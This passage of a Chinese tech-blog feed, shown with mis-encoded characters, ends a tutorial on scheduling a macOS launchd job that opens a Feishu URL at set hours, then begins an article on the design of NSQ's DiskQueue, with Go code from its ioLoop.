    <span class="hljs-tag">&lt;/<span class="hljs-name">array</span>&gt;</span>
    
    <span class="hljs-comment">&lt;!-- å®šæ—¶è§„åˆ™ï¼šæ¯å¤©7ä¸ªæ—¶é—´ç‚¹ï¼ˆ9/10/11/14/15/16/17ç‚¹ï¼‰ --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">key</span>&gt;</span>StartCalendarInterval<span class="hljs-tag">&lt;/<span class="hljs-name">key</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">array</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">dict</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">key</span>&gt;</span>Hour<span class="hljs-tag">&lt;/<span class="hljs-name">key</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">integer</span>&gt;</span>9<span class="hljs-tag">&lt;/<span class="hljs-name">integer</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">key</span>&gt;</span>Minute<span class="hljs-tag">&lt;/<span class="hljs-name">key</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">integer</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">integer</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dict</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">dict</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">key</span>&gt;</span>Hour<span class="hljs-tag">&lt;/<span class="hljs-name">key</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">integer</span>&gt;</span>10<span class="hljs-tag">&lt;/<span class="hljs-name">integer</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">key</span>&gt;</span>Minute<span class="hljs-tag">&lt;/<span class="hljs-name">key</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">integer</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">integer</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dict</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">dict</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">key</span>&gt;</span>Hour<span class="hljs-tag">&lt;/<span class="hljs-name">key</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">integer</span>&gt;</span>11<span class="hljs-tag">&lt;/<span class="hljs-name">integer</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">key</span>&gt;</span>Minute<span class="hljs-tag">&lt;/<span class="hljs-name">key</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">integer</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">integer</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dict</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">dict</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">key</span>&gt;</span>Hour<span class="hljs-tag">&lt;/<span class="hljs-name">key</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">integer</span>&gt;</span>14<span class="hljs-tag">&lt;/<span class="hljs-name">integer</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">key</span>&gt;</span>Minute<span class="hljs-tag">&lt;/<span class="hljs-name">key</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">integer</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">integer</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dict</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">dict</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">key</span>&gt;</span>Hour<span class="hljs-tag">&lt;/<span class="hljs-name">key</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">integer</span>&gt;</span>15<span class="hljs-tag">&lt;/<span class="hljs-name">integer</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">key</span>&gt;</span>Minute<span class="hljs-tag">&lt;/<span class="hljs-name">key</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">integer</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">integer</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dict</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">dict</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">key</span>&gt;</span>Hour<span class="hljs-tag">&lt;/<span class="hljs-name">key</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">integer</span>&gt;</span>16<span class="hljs-tag">&lt;/<span class="hljs-name">integer</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">key</span>&gt;</span>Minute<span class="hljs-tag">&lt;/<span class="hljs-name">key</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">integer</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">integer</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dict</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">dict</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">key</span>&gt;</span>Hour<span class="hljs-tag">&lt;/<span class="hljs-name">key</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">integer</span>&gt;</span>17<span class="hljs-tag">&lt;/<span class="hljs-name">integer</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">key</span>&gt;</span>Minute<span class="hljs-tag">&lt;/<span class="hljs-name">key</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">integer</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">integer</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dict</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">array</span>&gt;</span>
    
    <span class="hljs-comment">&lt;!-- æ—¥å¿—è·¯å¾„ï¼ˆç”¨äºæ’æŸ¥é”™è¯¯ï¼Œæ— éœ€ä¿®æ”¹ï¼‰ --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">key</span>&gt;</span>StandardOutPath<span class="hljs-tag">&lt;/<span class="hljs-name">key</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>/tmp/OpenFeishuURL.log<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">key</span>&gt;</span>StandardErrorPath<span class="hljs-tag">&lt;/<span class="hljs-name">key</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>/tmp/OpenFeishuURL.error.log<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dict</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">plist</span>&gt;</span>
</code></pre>
</li>
</ol>
</li>
<li>
<p>ä¿å­˜é…ç½®æ–‡ä»¶ï¼š</p>
<ol>
<li>æŒ‰ <code>Command+S</code>ï¼Œé€šè¿‡ã€Œä¸‰ã€å…³é”®å‰ç½®ã€ä¸­çš„æ–¹æ³•æ‰“å¼€ã€Œç”¨æˆ·èµ„æºåº“ï¼ˆ~/Libraryï¼‰ã€ï¼Œè¿›å…¥ <code>LaunchAgents</code> æ–‡ä»¶å¤¹ï¼ˆè‹¥æ²¡æœ‰è¯¥æ–‡ä»¶å¤¹ï¼Œæ‰‹åŠ¨æ–°å»ºå¹¶å‘½åä¸º <code>LaunchAgents</code>ï¼‰ã€‚</li>
<li>æ–‡ä»¶åè¾“å…¥ <code>com.user.OpenFeishuURL.plist</code>ï¼ˆéœ€ä¸ä»£ç ä¸­ã€ŒLabelã€å­—æ®µä¸€è‡´ï¼Œä¸å¯ä¿®æ”¹ï¼‰ï¼Œç‚¹å‡»ã€Œå­˜å‚¨ã€ã€‚</li>
</ol>
</li>
</ol>
<h3 data-id="heading-3">æ­¥éª¤ 3ï¼šé€šè¿‡ç»ˆç«¯åŠ è½½å¹¶æ¿€æ´»å®šæ—¶ä»»åŠ¡</h3>
<ol>
<li>
<p>æ‰“å¼€ã€Œç»ˆç«¯ã€ï¼šé€šè¿‡ Spotlight æœç´¢ï¼ˆè¾“å…¥ â€œç»ˆç«¯â€ï¼‰å¯åŠ¨ï¼Œæˆ–åœ¨ã€Œåº”ç”¨ç¨‹åºâ†’å®ç”¨å·¥å…·ã€ä¸­æ‰¾åˆ°ã€‚</p>
</li>
<li>
<p>å¸è½½æ—§ä»»åŠ¡ï¼ˆè‹¥ä¹‹å‰åŠ è½½è¿‡ï¼‰ï¼šè¾“å…¥ä»¥ä¸‹å‘½ä»¤ï¼ŒæŒ‰å›è½¦ï¼ˆè‹¥æç¤º â€œæ‰¾ä¸åˆ°æœåŠ¡â€ï¼Œç›´æ¥è·³è¿‡ï¼‰ï¼š</p>
<ol>
<li>
<pre><code class="hljs language-javascript" lang="javascript">launchctl unload ~<span class="hljs-regexp">/Library/</span><span class="hljs-title class_">LaunchAgents</span>/com.<span class="hljs-property">user</span>.<span class="hljs-property">OpenFeishuURL</span>.<span class="hljs-property">plist</span>
</code></pre>
</li>
</ol>
</li>
<li>
<p>åŠ è½½æ–°ä»»åŠ¡ï¼šè¾“å…¥ä»¥ä¸‹å‘½ä»¤ï¼ŒæŒ‰å›è½¦ï¼ˆè‹¥æç¤ºè¾“å…¥å¯†ç ï¼Œè¾“å…¥ Mac ç™»å½•å¯†ç ï¼Œè¾“å…¥æ—¶å¯†ç ä¸æ˜¾ç¤ºï¼Œè¾“å®Œç›´æ¥å›è½¦ï¼‰ï¼š</p>
<ol>
<li>
<pre><code class="hljs language-javascript" lang="javascript">launchctl bootstrap gui/$(id -u) ~<span class="hljs-regexp">/Library/</span><span class="hljs-title class_">LaunchAgents</span>/com.<span class="hljs-property">user</span>.<span class="hljs-property">OpenFeishuURL</span>.<span class="hljs-property">plist</span>
</code></pre>
</li>
<li>è‹¥æ‰§è¡Œåæ— ä»»ä½•æç¤ºï¼Œè¯´æ˜åŠ è½½æˆåŠŸï¼›è‹¥æœ‰æŠ¥é”™ï¼Œå‚è€ƒã€Œé—®é¢˜æ’æŸ¥ã€éƒ¨åˆ†å¤„ç†ã€‚</li>
</ol>
</li>
<li>
<p>éªŒè¯åŠ è½½ç»“æœï¼šè¾“å…¥ä»¥ä¸‹å‘½ä»¤ï¼ŒæŒ‰å›è½¦ï¼Œè‹¥æ˜¾ç¤ºåŒ…å« <code>com.user.OpenFeishuURL</code> çš„æ¡ç›®ï¼Œè¯´æ˜åŠ è½½æˆåŠŸï¼š</p>
<ol>
<li>
<pre><code class="hljs language-perl" lang="perl">launchctl list | <span class="hljs-keyword">grep</span> com.user.OpenFeishuURL
</code></pre>
</li>
</ol>
</li>
<li>
<p>æ‰‹åŠ¨æµ‹è¯•ä»»åŠ¡ï¼šè¾“å…¥ä»¥ä¸‹å‘½ä»¤ï¼ŒæŒ‰å›è½¦ï¼Œè‹¥æµè§ˆå™¨è‡ªåŠ¨æ‰“å¼€ç›®æ ‡ URLï¼Œä¸”å¼¹å‡ºæç¤ºï¼ˆè‹¥æœªåˆ é™¤æç¤ºä»£ç ï¼‰ï¼Œè¯´æ˜ä»»åŠ¡æ­£å¸¸ï¼š</p>
<ol>
<li>
<pre><code class="hljs language-sql" lang="sql">launchctl <span class="hljs-keyword">start</span> com.user.OpenFeishuURL
</code></pre>
</li>
</ol>
</li>
</ol>
<h2 data-id="heading-4">äº”ã€é—®é¢˜æ’æŸ¥</h2>
<h3 data-id="heading-5">1. åŠ è½½ä»»åŠ¡æ—¶æç¤º â€œInput/output errorâ€</h3>
<ul>
<li>
<p>åŸå› ï¼šplist æ–‡ä»¶æ ¼å¼é”™è¯¯æˆ–è·¯å¾„ä¸æ­£ç¡®ã€‚</p>
</li>
<li>
<p>è§£å†³ï¼š</p>
<ul>
<li>
<p>æ£€æŸ¥ plist çº¯æ–‡æœ¬æ ¼å¼ï¼šæ‰“å¼€ plist æ–‡ä»¶ï¼Œç¡®è®¤ã€Œæ ¼å¼ã€å·²å‹¾é€‰ã€Œåˆ¶ä½œçº¯æ–‡æœ¬ã€ã€‚</p>
</li>
<li>
<p>éªŒè¯ XML è¯­æ³•ï¼šåœ¨ç»ˆç«¯è¾“å…¥ä»¥ä¸‹å‘½ä»¤ï¼ŒæŒ‰å›è½¦ï¼Œæ ¹æ®æç¤ºä¿®æ­£é”™è¯¯ï¼ˆå¦‚ â€œç¬¬ X è¡Œç¼ºå°‘å¼•å·â€ï¼‰ï¼š</p>
<ol>
<li>
<pre><code class="hljs language-javascript" lang="javascript">plutil ~<span class="hljs-regexp">/Library/</span><span class="hljs-title class_">LaunchAgents</span>/com.<span class="hljs-property">user</span>.<span class="hljs-property">OpenFeishuURL</span>.<span class="hljs-property">plist</span>
</code></pre>
</li>
</ol>
</li>
<li>
<p>ç¡®è®¤è·¯å¾„æ­£ç¡®ï¼šæ£€æŸ¥ plist ä¸­ <code>ProgramArguments</code> ä¸‹çš„å·¥ä½œæµç¨‹è·¯å¾„ï¼Œç¡®ä¿ç”¨æˆ·åå’Œæ–‡ä»¶åæ­£ç¡®ï¼ˆå¯åœ¨ Finder ä¸­æ‰¾åˆ°æ–‡ä»¶ï¼Œæ‹–å…¥ç»ˆç«¯è·å–æ­£ç¡®è·¯å¾„ï¼‰ã€‚</p>
</li>
</ul>
</li>
</ul>
<h3 data-id="heading-6">2. æ‰‹åŠ¨æµ‹è¯•æ—¶ä¸æ‰“å¼€æµè§ˆå™¨</h3>
<ul>
<li>
<p>åŸå› ï¼šæƒé™ä¸è¶³æˆ–æµè§ˆå™¨è·¯å¾„é”™è¯¯ã€‚</p>
</li>
<li>
<p>è§£å†³ï¼š</p>
<ul>
<li>æ£€æŸ¥è‡ªåŠ¨åŒ–æƒé™ï¼šæ‰“å¼€ã€Œç³»ç»Ÿè®¾ç½®â†’éšç§ä¸å®‰å…¨æ€§â†’è‡ªåŠ¨åŒ–ã€ï¼Œç¡®ä¿ã€Œç»ˆç«¯ã€å’Œã€Œè‡ªåŠ¨æ“ä½œã€å·²å…è®¸è®¿é—®é»˜è®¤æµè§ˆå™¨ï¼ˆå¦‚ Safari/Chromeï¼‰ã€‚</li>
<li>ç¡®è®¤æµè§ˆå™¨è·¯å¾„ï¼šè‹¥æŒ‡å®š Chromeï¼Œæ£€æŸ¥ä»£ç ä¸­ <code>"/Applications/Google Chrome.app"</code> è·¯å¾„æ˜¯å¦æ­£ç¡®ï¼ˆè‹¥ Chrome å®‰è£…åœ¨å…¶ä»–ä½ç½®ï¼Œéœ€ä¿®æ”¹è·¯å¾„ï¼‰ã€‚</li>
</ul>
</li>
</ul>
<h3 data-id="heading-7">3. å®šæ—¶ä»»åŠ¡åˆ°ç‚¹ä¸æ‰§è¡Œ</h3>
<ul>
<li>
<p>åŸå› ï¼šMac å¤„äºä¼‘çœ çŠ¶æ€æˆ–ä»»åŠ¡æœªåŠ è½½ã€‚</p>
</li>
<li>
<p>è§£å†³ï¼š</p>
<ul>
<li>å…³é—­ä¼‘çœ ï¼šæ‰“å¼€ã€Œç³»ç»Ÿè®¾ç½®â†’ç”µæ± â†’ç”µæºé€‚é…å™¨ã€ï¼Œå‹¾é€‰ã€Œé˜²æ­¢ç”µè„‘è‡ªåŠ¨è¿›å…¥ç¡çœ ã€ï¼ˆç¬”è®°æœ¬éœ€æ¥ç”µæºï¼‰ã€‚</li>
<li>é‡æ–°åŠ è½½ä»»åŠ¡ï¼šæŒ‰æ­¥éª¤ 3 é‡æ–°æ‰§è¡Œ â€œå¸è½½â†’åŠ è½½â€ å‘½ä»¤ã€‚</li>
</ul>
</li>
</ul>
<h2 data-id="heading-8">å…­ã€åç»­ç®¡ç†</h2>
<h3 data-id="heading-9">1. ä¿®æ”¹å®šæ—¶æ—¶é—´</h3>
<ol>
<li>æ‰“å¼€ <code>~/Library/LaunchAgents/com.user.OpenFeishuURL.plist</code> æ–‡ä»¶ã€‚</li>
<li>ä¿®æ”¹ <code>StartCalendarInterval</code> ä¸‹çš„ <code>&lt;integer&gt;</code> æ•°å€¼ï¼ˆå¦‚å°† <code>9</code> æ”¹ä¸º <code>8</code>ï¼Œå³ 8 ç‚¹æ‰§è¡Œï¼‰ã€‚</li>
<li>åœ¨ç»ˆç«¯é‡æ–°æ‰§è¡Œ â€œå¸è½½â†’åŠ è½½â€ å‘½ä»¤ï¼Œä½¿ä¿®æ”¹ç”Ÿæ•ˆã€‚</li>
</ol>
<h3 data-id="heading-10">2. åœæ­¢å®šæ—¶ä»»åŠ¡</h3>
<p>åœ¨ç»ˆç«¯è¾“å…¥ä»¥ä¸‹å‘½ä»¤ï¼ŒæŒ‰å›è½¦ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript">launchctl unload ~<span class="hljs-regexp">/Library/</span><span class="hljs-title class_">LaunchAgents</span>/com.<span class="hljs-property">user</span>.<span class="hljs-property">OpenFeishuURL</span>.<span class="hljs-property">plist</span>
</code></pre>
<h3 data-id="heading-11">3. æ°¸ä¹…åˆ é™¤ä»»åŠ¡</h3>
<ol>
<li>
<p>æ‰§è¡Œ â€œåœæ­¢å®šæ—¶ä»»åŠ¡â€ å‘½ä»¤ã€‚</p>
</li>
<li>
<p>åˆ é™¤ä¸¤ä¸ªæ ¸å¿ƒæ–‡ä»¶ï¼š</p>
<ol>
<li>å·¥ä½œæµç¨‹ï¼š<code>~/Library/Scripts/OpenFeishuURL.workflow</code></li>
<li>é…ç½®æ–‡ä»¶ï¼š<code>~/Library/LaunchAgents/com.user.OpenFeishuURL.plist</code></li>
</ol>
</li>
</ol>
<pre><code class="hljs language-css" lang="css">ä½ å¯ä»¥ç›´æ¥å°†ä¸Šè¿°ä»£ç å¤åˆ¶åˆ°ä»»æ„ Markdown ç¼–è¾‘å™¨ï¼ˆå¦‚ Typoraã€VS <span class="hljs-selector-tag">Code</span>ã€é£ä¹¦æ–‡æ¡£ç­‰ï¼‰ä¸­ï¼Œå³å¯æ­£å¸¸æ˜¾ç¤ºæ ‡é¢˜ã€åˆ—è¡¨ã€ä»£ç å—ç­‰æ ¼å¼ã€‚å¦‚æœéœ€è¦è¿›ä¸€æ­¥è°ƒæ•´æ ¼å¼ï¼ˆå¦‚æ·»åŠ è¡¨æ ¼ã€è¡¥å……æ³¨é‡Šï¼‰ï¼Œæˆ–å¯¼å‡ºä¸º PDF/Wordï¼Œéƒ½å¯ä»¥åŸºäºè¿™ä¸ªåŸºç¡€ç‰ˆæœ¬ä¿®æ”¹~
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[NSQ ç£ç›˜æŒä¹…é˜Ÿåˆ— DiskQueue è®¾è®¡æ€æƒ³å…¨è§£æ]]></title>    <link>https://juejin.cn/post/7576914798056898612</link>    <guid>https://juejin.cn/post/7576914798056898612</guid>    <pubDate>2025-11-27T03:38:39.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7576914798056898612" data-draft-id="7576914798056882228" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="NSQ ç£ç›˜æŒä¹…é˜Ÿåˆ— DiskQueue è®¾è®¡æ€æƒ³å…¨è§£æ"/> <meta itemprop="keywords" content="Go,NSQ"/> <meta itemprop="datePublished" content="2025-11-27T03:38:39.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æƒ³æè‰ºæœ¯çš„ç¨‹åºå‘˜"/> <meta itemprop="url" content="https://juejin.cn/user/860232800801568"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            NSQ ç£ç›˜æŒä¹…é˜Ÿåˆ— DiskQueue è®¾è®¡æ€æƒ³å…¨è§£æ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/860232800801568/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æƒ³æè‰ºæœ¯çš„ç¨‹åºå‘˜
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-27T03:38:39.000Z" title="Thu Nov 27 2025 03:38:39 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-27
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><strong>â€”â€” ä¸ºä»€ä¹ˆ NSQ çš„ DiskQueue ä¸ç”¨é”ä¹Ÿèƒ½åšåˆ°é«˜æ€§èƒ½ã€å¼ºä¸€è‡´ï¼Ÿ</strong></p>
<p>NSQ çš„ <code>diskqueue</code> æ˜¯ä¸€ä¸ªæå…¶ä¼˜é›…çš„ç£ç›˜æŒä¹…åŒ– FIFO é˜Ÿåˆ—å®ç°ã€‚å®ƒçš„ä»£ç ä¸å¤šï¼Œå´è—ç€è®¸å¤šå·¥ç¨‹ä¸Šçš„å·§æ€ï¼š</p>
<ul>
<li>å•è°ƒåº¦åç¨‹ä¿è¯çº¿ç¨‹å®‰å…¨</li>
<li>è®°å½•æ ¼å¼ç®€æ´é«˜æ•ˆï¼ˆé•¿åº¦+æ•°æ®ï¼‰</li>
<li>å…ƒæ•°æ®æŒä¹…åŒ–è®¾è®¡ç¨³å¥</li>
<li>æ–‡ä»¶æ»šåŠ¨ç­–ç•¥å‡å°‘ IO å¹¶ä¿æŒæ€§èƒ½</li>
</ul>
<p>æœ¬æ–‡ä»<strong>è®¾è®¡æ€æƒ³</strong>åˆ‡å…¥ï¼Œç»“åˆæºç é€å—è§£æ <code>diskqueue</code> æ˜¯å¦‚ä½•å®ç°ä¸€ä¸ªå¯æŒä¹…ã€çº¿ç¨‹å®‰å…¨ã€æ€§èƒ½ç¨³å®šçš„ç£ç›˜é˜Ÿåˆ—ã€‚</p>
<hr/>
<h2 data-id="heading-0">1. å•åç¨‹è°ƒåº¦ï¼ˆioLoopï¼‰ä¿è¯çº¿ç¨‹å®‰å…¨ï¼šæ— éœ€åŠ é”</h2>
<p>DiskQueue çš„æœ€å·§å¦™è®¾è®¡ä¹‹ä¸€ï¼Œå°±æ˜¯æ‰€æœ‰å†™å…¥ã€è¯»å–ã€åŒæ­¥ã€æ–‡ä»¶æ»šåŠ¨ç­‰æ“ä½œéƒ½åœ¨ <strong>ä¸€ä¸ª ioLoop åç¨‹ä¸­å®Œæˆ</strong>ã€‚</p>
<p>å³ä½¿ <code>diskQueue</code> ç»“æ„ä½“ä¸Šå­˜åœ¨ <code>RWMutex</code>ï¼Œä½†æ ¸å¿ƒå˜é‡ï¼ˆread/write positionã€file numã€depthï¼‰éƒ½åªåœ¨ ioLoop ä¸­ä¿®æ”¹ï¼Œå› æ­¤<strong>å¯ä»¥ä¸ç”¨é”ï¼Œå¤©ç„¶çº¿ç¨‹å®‰å…¨</strong>ã€‚</p>
<p>åˆ›å»ºé˜Ÿåˆ—æ—¶å°±å¯åŠ¨è¿™ä¸ªåç¨‹ï¼š</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-comment">// diskqueue.go: New()</span>
<span class="hljs-keyword">go</span> d.ioLoop()
</code></pre>
<p>æ¥çœ‹ ioLoop çš„ç»“æ„ï¼š</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-comment">// diskqueue.go: ioLoop()</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(d *diskQueue)</span></span> ioLoop() {
    <span class="hljs-keyword">for</span> {
        <span class="hljs-keyword">select</span> {
        <span class="hljs-keyword">case</span> data := &lt;-d.writeChan:
            err := d.writeOne(data)
            d.writeResponseChan &lt;- err
        
        <span class="hljs-keyword">case</span> &lt;-d.emptyChan:
            err := d.deleteAllFiles()
            d.emptyResponseChan &lt;- err

